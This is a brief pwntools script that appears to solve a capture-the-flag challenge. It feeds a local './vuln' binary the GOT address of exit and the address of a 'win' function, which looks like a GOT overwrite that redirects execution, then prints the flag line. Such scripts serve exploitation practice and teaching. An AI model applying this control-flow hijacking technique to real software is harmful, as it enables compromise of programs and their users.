from pwn import *

e = ELF("./vuln")
p = e.process()

p.sendline(str(e.got["exit"]).encode("ascii"))
p.sendline(str(e.functions["win"].address).encode("ascii"))
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
